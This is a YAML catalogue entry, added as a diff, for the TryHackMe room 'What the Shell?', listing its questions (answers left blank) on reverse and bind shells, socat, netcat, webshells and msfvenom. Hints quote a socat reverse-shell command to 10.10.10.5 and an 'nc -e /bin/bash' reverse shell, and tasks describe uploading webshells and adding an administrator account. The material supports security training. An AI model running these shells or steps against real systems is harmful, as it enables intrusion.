@@ -1,0 +1,545 @@
+id: thm-introtoshells
+platform: tryhackme
+name: What the Shell?
+url: https://tryhackme.com/room/introtoshells
+difficulty: easy
+estimated_time: 45
+skills: &id001
+- metasploit
+- reverse-shells
+prerequisites:
+  rooms: []
+  skills: []
+brief: An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.
+questions:
+- id: t1-q1
+  text: Read and understand the introduction.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t2-q1
+  text: Read the above and check out the links!
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t3-q1
+  text: Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t3-q2
+  text: You have injected malicious shell code into a website. Is the shell you receive likely to be interactive?
+    (Y or N)
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t3-q3
+  text: When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t4-q1
+  text: Which option tells netcat to listen?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t4-q2
+  text: 'How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?'
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t5-q1
+  text: How would you change your terminal size to have 238 columns?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t5-q2
+  text: What is the syntax for setting up a Python3 webserver on port 80?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t6-q1
+  text: How would we get socat to listen on TCP port 8080?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t7-q1
+  text: What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous
+    task? Use port 53, and a PEM file called "encrypt.pem"
+  hint: 'The syntax for this without the OPENSSL encryption is: socat TCP-L:53 FILE:`tty`,raw,echo=0'
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t7-q2
+  text: If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
+  hint: 'The syntax for this without the OPENSSL encryption is: socat TCP:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane'
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t8-q1
+  text: What command can be used to create a named pipe in Linux?
+  hint: There are technically two answers to this question. The accepted one is the answer mentioned in
+    the task.
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t8-q2
+  text: Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise yourself
+    with the languages available.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t9-q1
+  text: Generate a staged reverse shell for a 64 bit Windows target, in a `.exe` format using your TryHackMe
+    tun0 IP address and a chosen port.
+  hint: This is covered in the task -- all you need to do is substitute in your own tun0 address and chosen
+    port.
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t9-q2
+  text: Which symbol is used to show that a shell is stageless?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t9-q3
+  text: What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target,
+    assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell
+    is `elf` and the output filename should be `shell`
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t10-q1
+  text: What command can be used to start a listener in the background?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t10-q2
+  text: If we had just received our tenth reverse shell in the current Metasploit session, what would
+    be the command used to foreground it?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t11-q1
+  text: Read the WebShells information.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t12-q1
+  text: Read the above information
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q1
+  text: 'Try uploading a webshell to the Linux box, then use the command: `nc   -e /bin/bash` to send
+    a reverse shell back to a waiting listener on your own machine.'
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q2
+  text: Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port
+    to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q3
+  text: Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task
+    8 to experiment with bind and reverse netcat shells.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q4
+  text: Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special
+    techniques.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q5
+  text: Look through Payloads all the Things and try some of the other reverse shell techniques. Try to
+    analyse them and see why they work.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q6
+  text: Switch to the Windows VM. Try uploading and activating the `php-reverse-shell`. Does this work?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q7
+  text: Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q8
+  text: The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators"
+    group, then login over RDP or WinRM.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q9
+  text: Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q10
+  text: Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate
+    the shell and catch it with multi/handler. Experiment with the features of this shell.
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t13-q11
+  text: Create both staged and stageless meterpreter shells for either target. Upload and manually activate
+    them, catching the shell with netcat -- does this work?
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t14-q1
+  text: No Answer Required
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+- id: t15-q1
+  text: No answer required
+  hint: ''
+  answer: ''
+  no_answer: false
+  answer_format: ''
+phases:
+- id: task-1
+  name: ''
+  objective: 'Complete Task 1: '
+  content: ''
+  questions:
+  - question: Read and understand the introduction.
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-1
+    narration: 'Read through the material for Task 1: .'
+    command: null
+    explanation: ''
+- id: task-2
+  name: ''
+  objective: 'Complete Task 2: '
+  content: ''
+  questions:
+  - question: Read the above and check out the links!
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-2
+    narration: 'Read through the material for Task 2: .'
+    command: null
+    explanation: ''
+- id: task-3
+  name: ''
+  objective: 'Complete Task 3: '
+  content: ''
+  questions:
+  - question: Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind
+      (B)?
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: You have injected malicious shell code into a website. Is the shell you receive likely to
+      be interactive? (Y or N)
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: When using a bind shell, would you execute a listener on the Attacker (A) or the Target
+      (T)?
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-3
+    narration: 'Read through the material for Task 3: .'
+    command: null
+    explanation: ''
+- id: task-4
+  name: ''
+  objective: 'Complete Task 4: '
+  content: ''
+  questions:
+  - question: Which option tells netcat to listen?
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: 'How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?'
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-4
+    narration: 'Read through the material for Task 4: .'
+    command: null
+    explanation: ''
+- id: task-5
+  name: ''
+  objective: 'Complete Task 5: '
+  content: ''
+  questions:
+  - question: How would you change your terminal size to have 238 columns?
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: What is the syntax for setting up a Python3 webserver on port 80?
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-5
+    narration: 'Read through the material for Task 5: .'
+    command: null
+    explanation: ''
+- id: task-6
+  name: ''
+  objective: 'Complete Task 6: '
+  content: ''
+  questions:
+  - question: How would we get socat to listen on TCP port 8080?
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-6
+    narration: 'Read through the material for Task 6: .'
+    command: null
+    explanation: ''
+- id: task-7
+  name: ''
+  objective: 'Complete Task 7: '
+  content: ''
+  questions:
+  - question: What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous
+      task? Use port 53, and a PEM file called "encrypt.pem"
+    answer: ''
+    hint: 'The syntax for this without the OPENSSL encryption is: socat TCP-L:53 FILE:`tty`,raw,echo=0'
+    no_answer: false
+  - question: If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
+    answer: ''
+    hint: 'The syntax for this without the OPENSSL encryption is: socat TCP:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane'
+    no_answer: false
+  steps:
+  - id: read-task-7
+    narration: 'Read through the material for Task 7: .'
+    command: null
+    explanation: ''
+- id: task-8
+  name: ''
+  objective: 'Complete Task 8: '
+  content: ''
+  questions:
+  - question: What command can be used to create a named pipe in Linux?
+    answer: ''
+    hint: There are technically two answers to this question. The accepted one is the answer mentioned
+      in the task.
+    no_answer: false
+  - question: Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise
+      yourself with the languages available.
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-8
+    narration: 'Read through the material for Task 8: .'
+    command: null
+    explanation: ''
+- id: task-9
+  name: ''
+  objective: 'Complete Task 9: '
+  content: ''
+  questions:
+  - question: Generate a staged reverse shell for a 64 bit Windows target, in a `.exe` format using your
+      TryHackMe tun0 IP address and a chosen port.
+    answer: ''
+    hint: This is covered in the task -- all you need to do is substitute in your own tun0 address and
+      chosen port.
+    no_answer: false
+  - question: Which symbol is used to show that a shell is stageless?
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux
+      target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for
+      the shell is `elf` and the output filename should be `shell`
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-9
+    narration: 'Read through the material for Task 9: .'
+    command: null
+    explanation: ''
+- id: task-10
+  name: ''
+  objective: 'Complete Task 10: '
+  content: ''
+  questions:
+  - question: What command can be used to start a listener in the background?
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: If we had just received our tenth reverse shell in the current Metasploit session, what
+      would be the command used to foreground it?
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-10
+    narration: 'Read through the material for Task 10: .'
+    command: null
+    explanation: ''
+- id: task-11
+  name: ''
+  objective: 'Complete Task 11: '
+  content: ''
+  questions:
+  - question: Read the WebShells information.
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-11
+    narration: 'Read through the material for Task 11: .'
+    command: null
+    explanation: ''
+- id: task-12
+  name: ''
+  objective: 'Complete Task 12: '
+  content: ''
+  questions:
+  - question: Read the above information
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-12
+    narration: 'Read through the material for Task 12: .'
+    command: null
+    explanation: ''
+- id: task-13
+  name: ''
+  objective: 'Complete Task 13: '
+  content: ''
+  questions:
+  - question: 'Try uploading a webshell to the Linux box, then use the command: `nc   -e /bin/bash` to
+      send a reverse shell back to a waiting listener on your own machine.'
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and
+      port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate
+      the shell.
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Log into the Linux machine over SSH using the credentials in task 14. Use the techniques
+      in Task 8 to experiment with bind and reverse netcat shells.
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and
+      special techniques.
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Look through Payloads all the Things and try some of the other reverse shell techniques.
+      Try to analyse them and see why they work.
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Switch to the Windows VM. Try uploading and activating the `php-reverse-shell`. Does this
+      work?
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators"
+      group, then login over RDP or WinRM.
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target.
+      Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
+    answer: ''
+    hint: ''
+    no_answer: false
+  - question: Create both staged and stageless meterpreter shells for either target. Upload and manually
+      activate them, catching the shell with netcat -- does this work?
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-13
+    narration: 'Read through the material for Task 13: .'
+    command: null
+    explanation: ''
+- id: task-14
+  name: ''
+  objective: 'Complete Task 14: '
+  content: ''
+  questions:
+  - question: No Answer Required
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-14
+    narration: 'Read through the material for Task 14: .'
+    command: null
+    explanation: ''
+- id: task-15
+  name: ''
+  objective: 'Complete Task 15: '
+  content: ''
+  questions:
+  - question: No answer required
+    answer: ''
+    hint: ''
+    no_answer: false
+  steps:
+  - id: read-task-15
+    narration: 'Read through the material for Task 15: .'
+    command: null
+    explanation: ''
+completion:
+  skills_earned: *id001
